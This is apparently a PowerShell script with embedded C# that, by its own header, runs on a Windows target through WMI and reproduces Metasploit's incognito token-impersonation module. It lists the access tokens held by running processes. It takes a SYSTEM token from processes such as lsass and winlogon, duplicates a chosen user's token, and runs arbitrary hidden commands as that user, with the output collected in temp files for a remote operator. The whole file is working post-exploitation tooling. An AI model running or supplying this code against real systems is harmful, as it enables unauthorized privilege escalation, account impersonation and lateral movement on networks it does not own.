# get_tokens.ps1
# Runs on the Windows target via WMI.
# Enumerates tokens and impersonates them using CreateProcessAsUserW.
# Mirrors Metasploit incognito module behavior.

param(
    [string]$OutFile  = "C:\Windows\Temp\tokens_out.txt",
    [string]$Mode     = "enum",
    [string]$Identity = "",
    [string]$Command  = "whoami",
    [string]$CmdOut   = "C:\Windows\Temp\cmd_out.txt",
    [string]$DoneFile = "",
    [string]$Cwd      = "C:\Windows\System32"
)

$code = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

public class Incognito {

    const uint TOKEN_ASSIGN_PRIMARY    = 0x0001;
    const uint TOKEN_DUPLICATE         = 0x0002;
    const uint TOKEN_IMPERSONATE       = 0x0004;
    const uint TOKEN_QUERY             = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_ADJUST_DEFAULT    = 0x0080;
    const uint TOKEN_ADJUST_SESSIONID  = 0x0100;
    const uint PROCESS_QUERY_INFO      = 0x0400;
    const uint SE_PRIVILEGE_ENABLED    = 0x00000002;
    const uint CREATE_NO_WINDOW        = 0x08000000;
    const uint NORMAL_PRIORITY_CLASS   = 0x00000020;

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr hProcess, uint dwAccess, out IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExisting, uint dwAccess, IntPtr lpAttr,
        int ImpersonationLevel, int TokenType, out IntPtr phNew);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool GetTokenInformation(
        IntPtr hToken, uint TokenInfoClass,
        IntPtr TokenInfo, int Length, out int ReturnLength);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool LookupAccountSid(
        string lpSystem, byte[] Sid,
        System.Text.StringBuilder Name, ref uint cchName,
        System.Text.StringBuilder Domain, ref uint cchDomain,
        out int peUse);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool LookupPrivilegeValue(string lpSystem, string lpName, out LUID luid);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool AdjustTokenPrivileges(
        IntPtr hToken, bool Disable, ref TOKEN_PRIVILEGES NewState,
        uint BufferLength, IntPtr Prev, IntPtr RetLen);

    // CreateProcessAsUserW — works under thread impersonation, needs SeAssignPrimaryToken
    // on the THREAD token (not just process token)
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CreateProcessAsUserW(
        IntPtr hToken,
        string lpApp,
        string lpCmd,
        IntPtr lpProcessAttr,
        IntPtr lpThreadAttr,
        bool bInherit,
        uint dwCreation,
        IntPtr lpEnv,
        string lpDir,
        ref STARTUPINFO lpSI,
        out PROCESS_INFORMATION lpPI);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int pid);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr hObj);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMs);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nBytes,
                                out uint lpRead, IntPtr lpOverlapped);

    static string DrainPipe(IntPtr hPipe) {
        var sb  = new System.Text.StringBuilder();
        var buf = new byte[4096];
        uint read;
        while (ReadFile(hPipe, buf, (uint)buf.Length, out read, IntPtr.Zero) && read > 0)
            sb.Append(System.Text.Encoding.Default.GetString(buf, 0, (int)read));
        return sb.ToString();
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
        ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES {
        public int    nLength;
        public IntPtr lpSecurityDescriptor;
        public bool   bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct STARTUPINFO {
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize;
        public int    dwXCountChars, dwYCountChars;
        public int    dwFillAttribute, dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int    dwProcessId, dwThreadId;
    }

    // ── Enable privilege on any token handle ──────────────────────────────────
    static void EnablePrivOnToken(IntPtr hToken, string privName) {
        LUID luid;
        if (!LookupPrivilegeValue(null, privName, out luid)) return;
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount        = 1;
        tp.Privileges.Luid       = luid;
        tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }

    static void EnablePrivilege(string privName) {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle,
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken)) return;
        EnablePrivOnToken(hToken, privName);
        CloseHandle(hToken);
    }

    // ── Resolve token to DOMAIN\user and type ────────────────────────────────
    static bool ResolveToken(IntPtr hToken, out string identity, out string type) {
        identity = "";
        type     = "Impersonation";
        int needed;

        GetTokenInformation(hToken, 8, IntPtr.Zero, 0, out needed);
        IntPtr tBuf = Marshal.AllocHGlobal(needed + 4);
        try {
            if (GetTokenInformation(hToken, 8, tBuf, needed, out needed)) {
                int tokenType = Marshal.ReadInt32(tBuf);
                if (tokenType == 1) {
                    type = "Delegation";
                } else {
                    GetTokenInformation(hToken, 10, IntPtr.Zero, 0, out needed);
                    IntPtr sBuf = Marshal.AllocHGlobal(needed + 8);
                    try {
                        if (GetTokenInformation(hToken, 10, sBuf, needed, out needed)) {
                            int impLevel = Marshal.ReadInt32(sBuf, 20);
                            type = (impLevel >= 3) ? "Delegation" : "Impersonation";
                        }
                    } finally { Marshal.FreeHGlobal(sBuf); }
                }
            }
        } finally { Marshal.FreeHGlobal(tBuf); }

        GetTokenInformation(hToken, 1, IntPtr.Zero, 0, out needed);
        IntPtr uBuf = Marshal.AllocHGlobal(needed + 8);
        try {
            if (!GetTokenInformation(hToken, 1, uBuf, needed, out needed)) return false;
            IntPtr sidPtr = Marshal.ReadIntPtr(uBuf);
            byte   count  = Marshal.ReadByte(sidPtr, 1);
            int    total  = 8 + 4 * count;
            byte[] sid    = new byte[total];
            Marshal.Copy(sidPtr, sid, 0, total);
            uint nLen = 256, dLen = 256;
            var  name = new System.Text.StringBuilder(256);
            var  dom  = new System.Text.StringBuilder(256);
            int  use;
            if (LookupAccountSid(null, sid, name, ref nLen, dom, ref dLen, out use)) {
                identity = dom.ToString() + "\\" + name.ToString();
                return true;
            }
        } catch { }
        finally { Marshal.FreeHGlobal(uBuf); }
        return false;
    }

    // ── LIST TOKENS ───────────────────────────────────────────────────────────
    public static List<string[]> ListTokens() {
        EnablePrivilege("SeDebugPrivilege");
        var map = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase);

        foreach (Process p in Process.GetProcesses()) {
            IntPtr hProc = OpenProcess(PROCESS_QUERY_INFO, false, p.Id);
            if (hProc == IntPtr.Zero) continue;
            try {
                IntPtr hToken;
                if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken)) continue;
                try {
                    string identity, type;
                    if (!ResolveToken(hToken, out identity, out type)) continue;
                    if (!map.ContainsKey(identity))
                        map[identity] = new string[] { type, "", "" };
                    if (type == "Delegation") map[identity][0] = "Delegation";
                    map[identity][1] += (map[identity][1].Length > 0 ? "," : "") + p.Id;
                    map[identity][2] += (map[identity][2].Length > 0 ? "," : "") + p.ProcessName;
                } finally { CloseHandle(hToken); }
            } finally { CloseHandle(hProc); }
        }

        var result = new List<string[]>();
        foreach (var kv in map)
            result.Add(new string[] { kv.Key, kv.Value[0], kv.Value[1], kv.Value[2] });
        return result;
    }

    // ── IMPERSONATE TOKEN ─────────────────────────────────────────────────────
    // Strategy:
    //   1. Impersonate a SYSTEM process token on our thread
    //   2. Enable SeAssignPrimaryTokenPrivilege + SeIncreaseQuotaPrivilege
    //      on the THREAD token (that is what CreateProcessAsUserW checks)
    //   3. Duplicate target user token as PRIMARY
    //   4. Call CreateProcessAsUserW with stdout/stderr pipes while still
    //      impersonating SYSTEM — NO >> redirection so the file is written
    //      once, completely, after the process exits (no race condition)
    //   5. RevertToSelf, drain pipes, write outFile, write doneFile
    public static string ImpersonateToken(string targetIdentity, string command,
                                          string outFile, string cwd,
                                          string doneFile) {
        EnablePrivilege("SeDebugPrivilege");

        // ── Step 1: impersonate a SYSTEM process on the current thread ─────────
        bool gotSystem = false;
        string[] systemProcs = { "lsass", "services", "winlogon", "wininit" };
        foreach (string sProc in systemProcs) {
            if (gotSystem) break;
            foreach (Process p in Process.GetProcessesByName(sProc)) {
                IntPtr hProc = OpenProcess(PROCESS_QUERY_INFO, false, p.Id);
                if (hProc == IntPtr.Zero) continue;
                try {
                    IntPtr hSysTok;
                    if (!OpenProcessToken(hProc,
                            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                            out hSysTok)) continue;
                    try {
                        IntPtr hImp;
                        if (!DuplicateTokenEx(hSysTok,
                                TOKEN_IMPERSONATE | TOKEN_QUERY |
                                TOKEN_ADJUST_PRIVILEGES,
                                IntPtr.Zero, 2, 2, out hImp)) continue;
                        try {
                            EnablePrivOnToken(hImp, "SeAssignPrimaryTokenPrivilege");
                            EnablePrivOnToken(hImp, "SeIncreaseQuotaPrivilege");
                            if (ImpersonateLoggedOnUser(hImp)) {
                                gotSystem = true; break;
                            }
                        } finally { CloseHandle(hImp); }
                    } finally { CloseHandle(hSysTok); }
                } finally { CloseHandle(hProc); }
            }
        }

        if (!gotSystem) {
            string msg = "ERROR: Could not impersonate SYSTEM thread token. WinError=" +
                         Marshal.GetLastWin32Error();
            File.WriteAllText(outFile, msg);
            if (doneFile != "") File.WriteAllText(doneFile, "done");
            return msg;
        }

        // ── Step 2: find and duplicate target user primary token ───────────────
        IntPtr bestToken = IntPtr.Zero;
        string bestType  = "";

        foreach (Process p in Process.GetProcesses()) {
            IntPtr hProc = OpenProcess(PROCESS_QUERY_INFO, false, p.Id);
            if (hProc == IntPtr.Zero) continue;
            try {
                IntPtr hToken;
                if (!OpenProcessToken(hProc,
                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                        out hToken)) continue;
                try {
                    string identity, type;
                    if (!ResolveToken(hToken, out identity, out type)) continue;
                    if (!identity.Equals(targetIdentity,
                            StringComparison.OrdinalIgnoreCase)) continue;
                    if (bestToken != IntPtr.Zero && bestType == "Delegation") continue;

                    IntPtr hDup;
                    bool okDup = DuplicateTokenEx(hToken,
                        TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
                        TOKEN_IMPERSONATE    | TOKEN_QUERY      |
                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                        IntPtr.Zero, 3, 1, out hDup);

                    if (!okDup) continue;
                    if (bestToken != IntPtr.Zero) CloseHandle(bestToken);
                    bestToken = hDup;
                    bestType  = type;

                } finally { CloseHandle(hToken); }
            } finally { CloseHandle(hProc); }
        }

        if (bestToken == IntPtr.Zero) {
            RevertToSelf();
            string msg = "ERROR: No token found for: " + targetIdentity;
            File.WriteAllText(outFile, msg);
            if (doneFile != "") File.WriteAllText(doneFile, "done");
            return msg;
        }

        // ── Step 3: create stdout/stderr pipes ────────────────────────────────
        // We use anonymous pipes and pass the write-end as the child's stdout
        // and stderr. This avoids >> redirection so there is no race between
        // the child writing and Python reading via SMB.
        IntPtr hReadOut = IntPtr.Zero, hWriteOut = IntPtr.Zero;
        IntPtr hReadErr = IntPtr.Zero, hWriteErr = IntPtr.Zero;

        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.nLength              = Marshal.SizeOf(sa);
        sa.bInheritHandle       = true;
        sa.lpSecurityDescriptor = IntPtr.Zero;

        if (!CreatePipe(out hReadOut, out hWriteOut, ref sa, 0) ||
            !CreatePipe(out hReadErr, out hWriteErr, ref sa, 0)) {
            RevertToSelf();
            CloseHandle(bestToken);
            string msg = "ERROR: CreatePipe failed. WinError=" + Marshal.GetLastWin32Error();
            File.WriteAllText(outFile, msg);
            if (doneFile != "") File.WriteAllText(doneFile, "done");
            return msg;
        }

        // Make read ends non-inheritable so only the child gets the write ends
        SetHandleInformation(hReadOut, 1, 0);
        SetHandleInformation(hReadErr, 1, 0);

        // ── Step 4: launch process with pipes ─────────────────────────────────
        try {
            string fullCmd = "cmd.exe /Q /c " + command;
            string workDir = (cwd != null && cwd.Length > 0) ? cwd.Replace('/', '\\') : "C:\\Windows\\System32";

            STARTUPINFO si = new STARTUPINFO();
            si.cb          = Marshal.SizeOf(si);
            si.dwFlags     = 0x00000101; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
            si.wShowWindow = 0;          // SW_HIDE
            si.hStdOutput  = hWriteOut;
            si.hStdError   = hWriteErr;
            si.hStdInput   = IntPtr.Zero;

            PROCESS_INFORMATION pi;

            bool created = CreateProcessAsUserW(
                bestToken, null, fullCmd,
                IntPtr.Zero, IntPtr.Zero,
                true,   // bInheritHandles — must be true for pipe handles
                CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,
                IntPtr.Zero, workDir, ref si, out pi);

            int lastErr = Marshal.GetLastWin32Error();
            RevertToSelf();

            // Close write ends in our process — child owns them now.
            // If we keep them open, ReadToEnd() below will block forever.
            CloseHandle(hWriteOut); hWriteOut = IntPtr.Zero;
            CloseHandle(hWriteErr); hWriteErr = IntPtr.Zero;

            if (!created) {
                string msg = "ERROR: CreateProcessAsUserW failed. WinError=" + lastErr +
                             " TokenType=" + bestType;
                File.WriteAllText(outFile, msg);
                if (doneFile != "") File.WriteAllText(doneFile, "done");
                return msg;
            }

            // ── Step 5: drain pipes then wait ─────────────────────────────────
            // Drain on background threads to avoid deadlock if pipe buffer fills.
            string stdoutData = "", stderrData = "";
            var tOut = new Thread(() => { stdoutData = DrainPipe(hReadOut); });
            var tErr = new Thread(() => { stderrData = DrainPipe(hReadErr); });
            tOut.Start(); tErr.Start();

            WaitForSingleObject(pi.hProcess, 15000);
            tOut.Join(5000); tErr.Join(5000);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            // ── Step 6: write output file then sentinel ────────────────────────
            string output = stdoutData;
            if (stderrData.Length > 0) output += stderrData;
            File.WriteAllText(outFile, output, System.Text.Encoding.UTF8);
            // Sentinel written LAST — Python polls for this file
            if (doneFile != "") File.WriteAllText(doneFile, "done");
            return output;

        } finally {
            CloseHandle(bestToken);
            if (hWriteOut != IntPtr.Zero) CloseHandle(hWriteOut);
            if (hWriteErr != IntPtr.Zero) CloseHandle(hWriteErr);
            if (hReadOut  != IntPtr.Zero) CloseHandle(hReadOut);
            if (hReadErr  != IntPtr.Zero) CloseHandle(hReadErr);
        }
    }
}
'@

try {
    Add-Type -TypeDefinition $code -Language CSharp -ErrorAction Stop
} catch {
    $errMsg = "Add-Type failed: $($_.Exception.Message)"
    [System.IO.File]::WriteAllText($OutFile,  "[{`"error`":`"$errMsg`"}]", [System.Text.Encoding]::UTF8)
    [System.IO.File]::WriteAllText($CmdOut,   $errMsg,                     [System.Text.Encoding]::UTF8)
    if ($DoneFile -ne "") {
        [System.IO.File]::WriteAllText($DoneFile, "done", [System.Text.Encoding]::UTF8)
    }
    exit 1
}

# ── Dispatch ──────────────────────────────────────────────────────────────────
if ($Mode -eq "enum") {
    try {
        $tokens  = [Incognito]::ListTokens()
        $entries = @()
        foreach ($t in $tokens) {
            $pids  = if ($t[2]) { $t[2].Split(",") | ForEach-Object { [int]$_ } } else { @() }
            $procs = if ($t[3]) { $t[3].Split(",") } else { @() }
            $parts = $t[0].Split("\", 2)
            $entries += [PSCustomObject]@{
                identity  = $t[0]
                domain    = if ($parts.Length -eq 2) { $parts[0] } else { "" }
                user      = if ($parts.Length -eq 2) { $parts[1] } else { $parts[0] }
                level     = $t[1]
                pid_count = $pids.Count
                pids      = $pids
                procs     = $procs[0..3]
            }
        }
        $json = $entries | ConvertTo-Json -Depth 4 -Compress
    } catch {
        $json = "[{`"error`":`"$($_.Exception.Message)`"}]"
    }
    [System.IO.File]::WriteAllText($OutFile, $json, [System.Text.Encoding]::UTF8)

} elseif ($Mode -eq "impersonate") {
    if (Test-Path $CmdOut) { Remove-Item $CmdOut -Force }
    # ImpersonateToken now writes $CmdOut and $DoneFile itself (inside C#),
    # so the sentinel is guaranteed written after pipes are fully drained.
    [Incognito]::ImpersonateToken($Identity, $Command, $CmdOut, $Cwd, $DoneFile) | Out-Null
}
